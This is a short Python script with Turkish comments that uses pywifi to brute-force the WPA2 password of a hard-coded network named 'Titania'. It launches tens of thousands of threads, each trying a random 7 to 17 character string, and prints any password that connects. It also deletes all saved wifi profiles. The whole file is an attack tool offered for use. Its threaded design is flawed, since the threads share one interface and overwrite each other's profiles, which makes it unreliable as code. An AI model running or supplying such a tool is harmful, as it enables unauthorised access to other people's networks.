import pywifi
from pywifi import const
from random import choices,randint
import threading

wifi = pywifi.PyWiFi()  # PyWiFi nesnesi oluşturulur
iface = wifi.interfaces()[0]  # İlk WiFi arabirimini seçer

def generate_token():
    characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRS-TUVWXYZ0123456789_"
    return ''.join(choices(characters, k=randint(7,17)))

def connect_wifi(ssid, password):
    iface.disconnect()  # Mevcut WiFi ağından bağlantıyı keser

    profile = pywifi.Profile()  # Yeni bir WiFi profili oluşturulur
    profile.ssid = ssid  # SSID (ağ adı) ayarlanır
    profile.auth = const.AUTH_ALG_OPEN  # Kimlik doğrulama algoritması ayarlanır
    profile.akm.append(const.AKM_TYPE_WPA2PSK)  # WPA2 şifreleme kullanılır
    profile.cipher = const.CIPHER_TYPE_CCMP  # AES şifreleme kullanılır
    profile.key = password  # Şifre ayarlanır

    iface.remove_all_network_profiles()  # Tüm WiFi profilleri kaldırılır
    tmp_profile = iface.add_network_profile(profile)  # Yeni profil eklenir

    iface.connect(tmp_profile)  # Yeni ağa bağlanılır

    # Bağlantı durumunu kontrol etmek için bir süre bekleyebilirsiniz
    import time
    time.sleep(5)

    if iface.status() == const.IFACE_CONNECTED:
        print("WiFi ağına başarıyla bağlandı.")
        return True
    else:
        print("WiFi ağına bağlantı başarısız.")
        return False

def connect_wifi_thread(ssid):
        password = generate_token()
        if connect_wifi(ssid, password):
            print("Password :",password)
            exit()

if __name__ == "__main__":
    ssid = "Titania"  # Bağlanmak istediğiniz WiFi ağının SSID'si

    for _ in range(200*255):
        t = threading.Thread(target=connect_wifi_thread, args=(ssid,))
        t.start()